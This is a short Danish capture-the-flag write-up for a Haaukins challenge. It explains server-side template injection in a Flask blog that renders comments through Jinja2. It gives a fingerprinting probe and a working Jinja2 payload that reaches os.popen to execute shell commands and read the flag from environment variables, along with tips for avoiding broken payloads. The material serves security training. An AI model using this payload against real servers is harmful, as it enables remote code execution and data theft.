Server-Side Template Injection → kør Python på serveren.

Web exploitationHaaukins CTF
🎓 Prøv selv først. Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.

Hvad går opgaven ud på?

En Flask-blog renderer dine kommentarer. Hvis input går gennem Jinja2's render_template_string, kan du injicere template-kode → RCE.

Trin for trin

MARK{{7*7}}MARK      -> "MARK49MARK"   => SSTI (Jinja2)
{{cycler.__init__.__globals__.os.popen('env').read()}}   # RCE som root -> FLAG=HKN{...}

Fælder: undgå { } " ' i din kommando (bryder Jinja-udtrykket) — brug env, cat /path. Stored SSTI kan 'brick'e en side ved en malformet payload — brug et frisk post, ét rent payload ad gangen. Flaget lå i en env-var, ikke en fil.

🚩 Vis løsning & eksempel-flag

Flag: HKN{...} (per-instans; fundet via env).

Hvad du har lært

  • {{7*7}}→49 = SSTI-fingeraftryk.
  • Jinja2-escape: {{cycler.__init__.__globals__.os.popen('cmd').read()}}.
  • Hold kommandoer brace-/quote-fri; flaget i Flask-apps er tit en env-var.
